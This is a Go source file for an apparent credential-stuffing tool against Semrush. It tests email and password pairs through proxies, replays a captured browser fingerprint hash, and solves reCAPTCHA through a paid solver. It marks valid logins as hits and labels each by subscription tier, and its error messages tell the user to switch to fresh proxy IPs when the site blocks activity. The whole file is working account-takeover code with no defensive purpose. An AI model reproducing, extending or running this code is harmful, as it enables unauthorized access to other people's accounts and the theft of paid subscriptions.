package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var semrushPlanRE = regexp.MustCompile(`"(?:plan|product|subscription|toolkit|tariff|package)(?:Name|Title|Type|Id)?"\s*:\s*"([^"]{2,80})"`)

func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	uaHash := c.cfg.SemrushUserAgentHash()
	if uaHash == "" {
		result.Status = StatusError
		result.Reason = "missing user_agent_hash in config (FingerprintJS visitorId from browser capture)"
		return result
	}

	loginURL := c.cfg.LoginURL()
	referer := loginURL

	// Step 1: GET login page (session + site_csrftoken cookies)
	_, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"User-Agent": c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}

	// Step 2: GET /olaf then POST /olaf/init (_sm_bot session bootstrap)
	_, _, _, _ = c.doRequest(client, "GET", c.cfg.BaseURL()+"/olaf", map[string]string{
		"Accept":     "*/*",
		"Referer":    referer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	_, olafStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushOlafInitURL(), map[string]string{
		"Accept":     "*/*",
		"Origin":     c.cfg.BaseURL(),
		"Referer":    referer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	if err != nil {
		status, reason := c.resultFromRequestErr("olaf/init", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if olafStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("olaf/init HTTP 429")
		return result
	}

	// Step 3: POST /sso/options (SSO flags — may indicate captcha)
	optsBody := fmt.Sprintf(`{"withCredentials":true,"user-agent-hash":%s}`, jsonString(uaHash))
	optsResp, optsStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushSSOOptionsURL(), map[string]string{
		"Accept":       "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"Origin":       c.cfg.BaseURL(),
		"Referer":      referer,
		"User-Agent":   c.cfg.UserAgent,
	}, optsBody)
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/options", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if optsStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/options HTTP 429")
		return result
	}
	var captchaToken string
	var capErr error
	if semrushOptionsRequireRecaptcha(optsResp) || semrushResponseNeedsRecaptcha(optsResp) {
		captchaToken, capErr = c.solveSemrushRecaptcha(loginURL)
		if captchaToken == "" {
			result.Status = StatusRecaptchaRequired
			if capErr != nil {
				result.Reason = capErr.Error()
			} else {
				result.Reason = "reCAPTCHA required — add twocaptcha_api_key to semrush.json variables"
			}
			return result
		}
	}

	// Step 4: POST /sso/authorize
	authBody, authStatus, authHeaders, err := c.postSemrushAuthorize(client, email, password, uaHash, referer, captchaToken)
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/authorize", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if authStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/authorize HTTP 429")
		return result
	}
	if semrushNeedsRecaptchaRetry(authBody, authStatus) {
		if captchaToken == "" {
			captchaToken, capErr = c.solveSemrushRecaptcha(loginURL)
		}
		if captchaToken == "" {
			result.Status = StatusRecaptchaRequired
			if capErr != nil {
				result.Reason = capErr.Error()
			} else {
				result.Reason = "reCAPTCHA required — add twocaptcha_api_key to semrush.json variables"
			}
			return result
		}
		authBody, authStatus, authHeaders, err = c.postSemrushAuthorize(client, email, password, uaHash, referer, captchaToken)
		if err != nil {
			status, reason := c.resultFromRequestErr("sso/authorize retry", err)
			result.Status = status
			result.Reason = reason
			return result
		}
	}

	if failReason := parseSemrushAuthFailure(authBody, authStatus); failReason != "" {
		switch failReason {
		case "recaptcha_required":
			result.Status = StatusRecaptchaRequired
			result.Reason = "reCAPTCHA required — use 1 worker, fresh proxy IP, or captcha solver token"
		case "activity_reset":
			result.Status = StatusRateLimited
			result.Reason = "Semrush activity reset — retry with fresh proxy IP"
		default:
			result.Status = StatusFail
			result.Reason = failReason
		}
		return result
	}
	if semrushAuthBodyIndicatesFailure(authBody) {
		result.Status = StatusFail
		result.Reason = semrushAuthFailureReason(authBody, "invalid email or password")
		return result
	}
	if authStatus < 200 || authStatus >= 300 {
		result.Status = StatusFail
		result.Reason = fmt.Sprintf("login failed (HTTP %d)", authStatus)
		return result
	}

	if !semrushApplySSOToken(client, authBody, authHeaders) {
		st, reason := semrushMissingTokenFailure(authBody, authStatus)
		result.Status = st
		result.Reason = reason
		return result
	}

	c.followSemrushPostAuth(client, authBody, authHeaders)

	verified, accountEmail, verifyKind, verifyReason := c.verifySemrushSession(client, optsResp, authBody, authStatus)
	if !verified {
		switch verifyKind {
		case "captcha":
			result.Status = StatusRecaptchaRequired
		case "error":
			result.Status = StatusError
		default:
			result.Status = StatusFail
		}
		if verifyReason == "" {
			switch verifyKind {
			case "captcha":
				verifyReason = "reCAPTCHA required — session not verified"
			case "error":
				verifyReason = "session verification error"
			default:
				verifyReason = "invalid email or password"
			}
		}
		result.Reason = verifyReason
		return result
	}

	result.AccountEmail = accountEmail
	if result.AccountEmail == "" {
		result.AccountEmail = email
	}

	// Step 5: subscription header API (from ONF capture — Profile → Subscription Info)
	if result.PlanName == "" {
		if plan, ok := c.fetchSemrushSubscriptionPlan(client); ok {
			result.PlanName = plan
		}
	}

	// Step 6: fallback — dashboard HTML (legacy)
	if result.PlanName == "" {
		homeURL := c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/")
		homeBody, homeStatus, _, err := c.doRequest(client, "GET", homeURL, map[string]string{
			"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Referer":    referer,
			"User-Agent": c.cfg.UserAgent,
		}, "")
		if err == nil && homeStatus == http.StatusOK {
			if plan, ok := extractSemrushPlanFromHTML(homeBody); ok {
				result.PlanName = plan
			}
		}
	}

	if result.PlanName == "" {
		result.PlanName = "Logged In"
		result.PlanLabel = "UNKNOWN"
		result.Status = StatusHit
		result.Reason = "login ok — subscription API unreachable"
		return result
	}

	result.PlanLabel = classifySemrushPlan(result.PlanName)
	result.Status = StatusHit
	return result
}

func semrushParseSSOToken(authBody string, headers http.Header) string {
	if token, ok := jsonPathString(authBody, "token"); ok && token != "" {
		return token
	}
	if headers != nil {
		for _, raw := range headers.Values("Set-Cookie") {
			for _, part := range strings.Split(raw, ";") {
				part = strings.TrimSpace(part)
				if strings.HasPrefix(part, "sso_token=") {
					val := strings.TrimPrefix(part, "sso_token=")
					if val != "" {
						return val
					}
				}
			}
		}
	}
	return ""
}

func semrushApplySSOToken(client *http.Client, authBody string, headers http.Header) bool {
	token := semrushParseSSOToken(authBody, headers)
	if token == "" {
		return false
	}
	if client == nil || client.Jar == nil {
		return false
	}
	base := "https://www.semrush.com"
	u, err := url.Parse(base)
	if err != nil {
		return false
	}
	expires := time.Now().Add(24 * time.Hour)
	if expStr, ok := jsonPathString(authBody, "expires_at"); ok && expStr != "" {
		if ts, err := strconv.ParseInt(expStr, 10, 64); err == nil && ts > 0 {
			expires = time.Unix(ts, 0)
		}
	}
	client.Jar.SetCookies(u, []*http.Cookie{
		{
			Name:     "sso_token",
			Value:    token,
			Path:     "/",
			Domain:   ".semrush.com",
			Expires:  expires,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteLaxMode,
		},
	})
	return true
}

func semrushMissingTokenFailure(authBody string, authStatus int) (CheckStatus, string) {
	if fail := parseSemrushAuthFailure(authBody, authStatus); fail != "" {
		switch fail {
		case "recaptcha_required":
			return StatusRecaptchaRequired, "reCAPTCHA required — add twocaptcha_api_key or use fresh proxy IP"
		case "activity_reset":
			return StatusRateLimited, "Semrush activity reset — retry with fresh proxy IP"
		default:
			return StatusFail, fail
		}
	}
	trimmed := strings.TrimSpace(authBody)
	if trimmed == "" || trimmed == "{}" {
		return StatusRecaptchaRequired, "reCAPTCHA/IP block — empty authorize response (try residential proxy or 2captcha)"
	}
	if semrushResponseIsRecaptchaHTML(authBody) || semrushResponseNeedsRecaptcha(authBody) {
		return StatusRecaptchaRequired, "reCAPTCHA required — Semrush blocked login from this IP"
	}
	snippet := trimmed
	if len(snippet) > 120 {
		snippet = snippet[:120] + "..."
	}
	return StatusError, fmt.Sprintf("authorize HTTP %d without SSO token: %s", authStatus, snippet)
}

func semrushAuthSessionFromBody(body string) (bool, string) {
	token, hasToken := jsonPathString(body, "token")
	userID, hasUser := jsonPathString(body, "user_id")
	if hasToken && token != "" && hasUser && userID != "" {
		return true, userID
	}
	return false, ""
}

func (c *Checker) postSemrushAuthorize(client *http.Client, email, password, uaHash, referer, captchaToken string) (string, int, http.Header, error) {
	authPayload := map[string]string{
		"locale":               "en",
		"source":               "semrush",
		"g-recaptcha-response": captchaToken,
		"user-agent-hash":      uaHash,
		"email":                email,
		"password":             password,
	}
	authJSON, _ := json.Marshal(authPayload)
	return c.doRequest(client, "POST", c.cfg.SemrushAuthorizeURL(), map[string]string{
		"Accept":          "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "en-US,en;q=0.9",
		"Content-Type":    "application/json",
		"Origin":          c.cfg.BaseURL(),
		"Referer":         referer,
		"User-Agent":      c.cfg.UserAgent,
	}, string(authJSON))
}

func semrushNeedsRecaptchaRetry(body string, status int) bool {
	if parseSemrushAuthFailure(body, status) == "recaptcha_required" {
		return true
	}
	return semrushResponseNeedsRecaptcha(body)
}

func (c *Checker) followSemrushPostAuth(client *http.Client, authBody string, authHeaders http.Header) {
	headers := map[string]string{
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"User-Agent": c.cfg.UserAgent,
	}
	base := c.cfg.BaseURL()
	var urls []string
	if loc := authHeaders.Get("Location"); loc != "" {
		urls = append(urls, loc)
	}
	for _, key := range []string{"redirect", "redirect_to", "redirectUrl"} {
		if u, ok := jsonPathString(authBody, key); ok && u != "" {
			urls = append(urls, u)
		}
	}
	seen := map[string]struct{}{}
	for _, u := range urls {
		if !strings.HasPrefix(u, "http") {
			if strings.HasPrefix(u, "/") {
				u = base + u
			} else {
				u = base + "/" + u
			}
		}
		if _, ok := seen[u]; ok {
			continue
		}
		seen[u] = struct{}{}
		_, _, _, _ = c.doRequest(client, "GET", u, headers, "")
	}
	// Browser always loads /home/ after authorize to finalize SSO cookies (sso_token).
	homeURL := c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/")
	_, _, _, _ = c.doRequest(client, "GET", homeURL, map[string]string{
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer":    c.cfg.LoginURL(),
		"User-Agent": c.cfg.UserAgent,
	}, "")
}

func (c *Checker) verifySemrushSession(client *http.Client, optsResp, authBody string, authStatus int) (ok bool, accountEmail, kind, reason string) {
	if semrushAuthBodyIsWrongCredentials(authBody) {
		return false, "", "invalid", "invalid email or password"
	}
	if sessionOK, _ := semrushAuthSessionFromBody(authBody); sessionOK {
		// token cookie applied after authorize; continue to user-info for email + plan APIs
	}

	userInfoURL := c.cfg.Var("user_info_url", c.cfg.BaseURL()+"/accounts/user-info")
	headers := map[string]string{
		"Accept":     "application/json, text/plain, */*",
		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
		"User-Agent": c.cfg.UserAgent,
	}
	body, status, _, err := c.doRequest(client, "GET", userInfoURL, headers, "")
	if err != nil {
		return false, "", "error", err.Error()
	}
	if status == http.StatusOK && semrushUserInfoJSON(body) {
		email, _ := jsonPathString(body, "email")
		id, _ := jsonPathString(body, "id")
		if email != "" || id != "" {
			if activated, okAct := jsonPathString(body, "activated"); okAct && activated == "false" {
				return false, "", "invalid", "account not activated"
			}
			return true, email, "", ""
		}
	}

	// Fallback: subscription header JSON proves authenticated session.
	subReferer := c.cfg.Var("subscription_page_url", c.cfg.BaseURL()+"/accounts/subscription-info/")
	subBody, subStatus, _, _ := c.doRequest(client, "GET", c.cfg.AccountQueryURL(), map[string]string{
		"Accept":     "application/json, text/plain, */*",
		"Referer":    subReferer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	if subStatus == http.StatusOK {
		if _, okPlan := parseSemrushSubscriptionHeader(subBody); okPlan {
			if semrushUserInfoJSON(body) {
				email, _ := jsonPathString(body, "email")
				if email != "" {
					return true, email, "", ""
				}
			}
			return true, "", "", ""
		}
	}
	if subStatus == http.StatusUnauthorized || strings.Contains(strings.ToLower(subBody), "unauthorized") {
		return false, "", "captcha", "reCAPTCHA required — subscription API unauthorized"
	}

	if semrushResponseNeedsRecaptcha(authBody) || semrushOptionsRequireRecaptcha(optsResp) {
		return false, "", "captcha", "reCAPTCHA required — Semrush blocked automated login from this IP"
	}
	if semrushIsHTMLBlockPage(body) || status == http.StatusForbidden {
		return false, "", "captcha", "reCAPTCHA required — session not established (user-info blocked)"
	}
	if status == http.StatusUnauthorized {
		return false, "", "captcha", "reCAPTCHA required — not authenticated after login attempt"
	}
	if authStatus >= 200 && authStatus < 300 && strings.TrimSpace(authBody) == "" {
		return false, "", "captcha", "reCAPTCHA required — empty authorize response (no SSO session)"
	}
	return false, "", "captcha", "reCAPTCHA required — could not verify login session"
}

func semrushUserInfoJSON(body string) bool {
	trimmed := strings.TrimSpace(body)
	return strings.HasPrefix(trimmed, "{") && strings.Contains(trimmed, `"email"`)
}

func semrushIsHTMLBlockPage(body string) bool {
	lower := strings.ToLower(body)
	return strings.HasPrefix(strings.TrimSpace(body), "<!") ||
		strings.Contains(lower, "secret page") ||
		strings.Contains(lower, "<html")
}

func semrushAuthBodyIsWrongCredentials(body string) bool {
	mc := semrushMessageCode(body)
	switch mc {
	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
		return true
	}
	lower := strings.ToLower(body)
	for _, phrase := range []string{
		"wrong login or password",
		"invalid email or password",
		"incorrect email or password",
	} {
		if strings.Contains(lower, phrase) {
			return true
		}
	}
	return false
}

func semrushOptionsRequireRecaptcha(body string) bool {
	if semrushResponseNeedsRecaptcha(body) {
		return true
	}
	return strings.Contains(strings.ToLower(body), `"recaptcha_authorize":true`)
}

func semrushMessageCode(body string) string {
	if mc, ok := jsonPathString(body, "message_code"); ok {
		return strings.ToUpper(strings.TrimSpace(mc))
	}
	return ""
}

func semrushAuthBodyIndicatesFailure(body string) bool {
	if success, ok := jsonPathString(body, "success"); ok && success == "false" {
		return true
	}
	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "false" {
		return true
	}
	if token, ok := jsonPathString(body, "token"); ok && token != "" {
		return false
	}
	code := semrushErrorCode(body)
	if strings.HasPrefix(code, "ERROR") {
		return true
	}
	reason := parseSemrushAuthFailure(body, 0)
	return reason != "" && reason != "recaptcha_required"
}

func semrushAuthFailureReason(body, fallback string) string {
	if reason := parseSemrushAuthFailure(body, 0); reason != "" && reason != "recaptcha_required" {
		return reason
	}
	return fallback
}

func (c *Checker) fetchSemrushSubscriptionPlan(client *http.Client) (string, bool) {
	subReferer := c.cfg.Var("subscription_page_url", c.cfg.BaseURL()+"/accounts/subscription-info/")
	apiHeaders := map[string]string{
		"Accept":     "application/json, text/plain, */*",
		"Referer":    subReferer,
		"User-Agent": c.cfg.UserAgent,
	}

	// Warm subscription session (browser loads this page before XHR calls).
	_, _, _, _ = c.doRequest(client, "GET", subReferer, map[string]string{
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
		"User-Agent": c.cfg.UserAgent,
	}, "")

	headerURL := c.cfg.AccountQueryURL()
	headerBody, headerStatus, _, err := c.doRequest(client, "GET", headerURL, apiHeaders, "")
	if err == nil && headerStatus == http.StatusOK {
		if plan, ok := parseSemrushSubscriptionHeader(headerBody); ok {
			return plan, true
		}
	}

	toolkitsURL := c.cfg.Var("toolkits_summary_url", c.cfg.BaseURL()+"/accounts/subscription-info/api/v1/toolkits/summary/")
	toolkitsBody, toolkitsStatus, _, err := c.doRequest(client, "GET", toolkitsURL, apiHeaders, "")
	if err == nil && toolkitsStatus == http.StatusOK {
		if plan, ok := extractSemrushPurchasedToolkits(toolkitsBody); ok {
			return plan, true
		}
	}

	return "", false
}

func parseSemrushSubscriptionHeader(body string) (string, bool) {
	title, _ := jsonPathString(body, "subscription.title")
	isFree, _ := jsonPathString(body, "subscription.is_free")
	isSubUser, _ := jsonPathString(body, "subscription.is_sub_user")
	paidTill, _ := jsonPathString(body, "subscription.paid_till")

	title = strings.TrimSpace(title)
	if title != "" {
		if isSubUser == "true" && !strings.Contains(strings.ToLower(title), "sub") {
			title += " (Sub User)"
		}
		return title, true
	}
	if isFree == "true" {
		return "Free", true
	}
	if paidTill != "" && paidTill != "null" {
		return "Paid", true
	}
	return "", false
}

func extractSemrushPurchasedToolkits(body string) (string, bool) {
	var data struct {
		Toolkits []struct {
			Tiers []struct {
				Title       string `json:"title"`
				IsPurchased bool   `json:"is_purchased"`
			} `json:"tiers"`
		} `json:"toolkits"`
	}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return "", false
	}
	var parts []string
	for _, tk := range data.Toolkits {
		for _, tier := range tk.Tiers {
			if tier.IsPurchased {
				parts = append(parts, strings.TrimSpace(tier.Title))
			}
		}
	}
	if len(parts) == 0 {
		return "", false
	}
	return strings.Join(parts, " + "), true
}

func (c *Checker) fetchURL(client *http.Client, rawURL string, headers map[string]string) (string, int, error) {
	retries := c.cfg.Settings.RetryOnError
	if retries < 0 {
		retries = 0
	}
	var body string
	var status int
	var err error
	for attempt := 0; attempt <= retries; attempt++ {
		body, status, _, err = c.doRequest(client, "GET", rawURL, headers, "")
		if err != nil {
			if isRateLimitErr(err) && attempt < retries {
				proxyRetrySleep(attempt)
				continue
			}
			if isRateLimitErr(err) {
				return "", http.StatusTooManyRequests, nil
			}
			return "", 0, err
		}
		if status == http.StatusOK {
			return body, status, nil
		}
		if isRateLimitedStatus(status) && attempt < retries {
			proxyRetrySleep(attempt)
			continue
		}
		return body, status, nil
	}
	return body, status, nil
}

func semrushErrorCode(body string) string {
	if mc := semrushMessageCode(body); mc != "" {
		return mc
	}
	if code, ok := jsonPathString(body, "code"); ok {
		return strings.ToUpper(strings.TrimSpace(code))
	}
	if code, ok := jsonPathString(body, "error.code"); ok {
		return strings.ToUpper(strings.TrimSpace(code))
	}
	return ""
}

func semrushResponseIsRecaptchaHTML(body string) bool {
	lower := strings.ToLower(body)
	if !strings.Contains(lower, "<!doctype") && !strings.Contains(lower, "<html") {
		return false
	}
	for _, marker := range []string{
		"google.com/recaptcha",
		"recaptcha/challengepage",
		"g-recaptcha",
		"recaptcha/api2",
		"enterprise/challenge",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func semrushResponseNeedsRecaptcha(body string) bool {
	if semrushResponseIsRecaptchaHTML(body) {
		return true
	}
	code := semrushErrorCode(body)
	if code == "ERROR_RECAPTCHA" || code == "ERROR_CAPTCHA" || code == "ERROR_RECAPTCHA_NEED" {
		return true
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, `"recaptcha_authorize"`) && strings.Contains(lower, `"enabled":true`) {
		return true
	}
	if strings.Contains(lower, `"captcha"`) && strings.Contains(lower, `"required":true`) {
		return true
	}
	if msg, ok := jsonPathString(body, "message"); ok {
		msgLower := strings.ToLower(msg)
		if strings.Contains(msgLower, "recaptcha") && strings.Contains(msgLower, "required") {
			return true
		}
	}
	if strings.Contains(lower, "recaptcha is required") {
		return true
	}
	return false
}

func parseSemrushAuthFailure(body string, status int) string {
	if semrushResponseIsRecaptchaHTML(body) {
		return "recaptcha_required"
	}
	code := semrushErrorCode(body)
	lower := strings.ToLower(body)

	switch code {
	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA", "ERROR_RECAPTCHA_NEED":
		return "recaptcha_required"
	case "ERROR_ACTIVITY_RESET_MESSAGE", "ERROR_ACTIVITY_RESET", "ERROR_SUSPICIOUS_ACTIVITY", "ERROR_IP_BLOCKED":
		return "activity_reset"
	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
		return "invalid email or password"
	case "ERROR_UAHASH_INVALID":
		return "invalid user-agent-hash — update user_agent_hash in semrush.json from browser"
	case "ERROR_UAHASH_REQUIRED":
		return "missing user-agent-hash"
	case "ERROR_TOKEN_INVALID":
		return "invalid login token"
	}

	failPhrases := map[string]string{
		"wrong login or password":     "invalid email or password",
		"invalid email or password":   "invalid email or password",
		"incorrect email or password": "invalid email or password",
		"wrong password":              "invalid email or password",
		"account locked":              "account locked",
		"too many attempts":           "too many attempts",
	}
	for needle, reason := range failPhrases {
		if strings.Contains(lower, needle) {
			return reason
		}
	}
	if code != "" && strings.HasPrefix(code, "ERROR") {
		return code
	}
	if status == http.StatusUnauthorized || status == http.StatusForbidden {
		if semrushAuthBodyIsWrongCredentials(body) {
			return "invalid email or password"
		}
		return "recaptcha_required"
	}
	if status == http.StatusBadRequest || status == http.StatusUnprocessableEntity {
		if semrushResponseNeedsRecaptcha(body) {
			return "recaptcha_required"
		}
		if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
			return msg
		}
	}
	// Some Semrush error payloads still return HTTP 2xx — body text already scanned above.
	return ""
}

func semrushAuthSucceeded(body string, status int) bool {
	if status < 200 || status >= 300 {
		return false
	}
	if semrushAuthBodyIndicatesFailure(body) {
		return false
	}
	if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
		return true
	}
	if redirect, ok := jsonPathString(body, "redirect_to"); ok && redirect != "" {
		return true
	}
	if redirect, ok := jsonPathString(body, "redirectUrl"); ok && redirect != "" {
		return true
	}
	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "true" {
		return true
	}
	if success, ok := jsonPathString(body, "success"); ok && success == "true" {
		return true
	}
	if token, ok := jsonPathString(body, "token"); ok && token != "" {
		return true
	}
	// Empty authorize body is not proof of login — caller must verify session separately.
	return false
}

func extractSemrushPlanFromJSON(body string) (string, bool) {
	for _, path := range []string{
		"subscription.title",
		"subscription.name",
		"subscription.plan",
		"plan.name",
		"planName",
		"product.name",
		"toolkit.name",
		"data.subscription.name",
		"data.subscription.title",
		"data.plan.name",
	} {
		if val, ok := jsonPathString(body, path); ok && val != "" {
			return val, true
		}
	}
	return "", false
}

func extractSemrushPlanFromHTML(body string) (string, bool) {
	if plan, ok := extractSemrushPlanFromJSON(body); ok {
		return plan, true
	}
	matches := semrushPlanRE.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) >= 2 {
			val := strings.TrimSpace(m[1])
			if val != "" && !strings.EqualFold(val, "null") {
				return val, true
			}
		}
	}
	needles := []string{
		"SEO Pro", "SEO Guru", "Business", "Semrush One", "Content Toolkit",
		"Local Pro", "Local Business", "Free", "Trial",
	}
	lower := strings.ToLower(body)
	for _, n := range needles {
		if strings.Contains(lower, strings.ToLower(n)) {
			return n, true
		}
	}
	return "", false
}

func classifySemrushPlan(planName string) string {
	lower := strings.ToLower(planName)
	switch {
	case strings.Contains(lower, "logged in"):
		return "UNKNOWN"
	case strings.Contains(lower, "trial"):
		return "FREE_TRIAL"
	case strings.Contains(lower, "free"):
		return "FREE"
	case strings.Contains(lower, "business"):
		return "BUSINESS"
	case strings.Contains(lower, "guru"):
		return "GURU"
	case strings.Contains(lower, "pro"):
		return "PRO"
	case strings.Contains(lower, "agency") || strings.Contains(lower, "enterprise"):
		return "ENTERPRISE"
	default:
		return "PAID"
	}
}
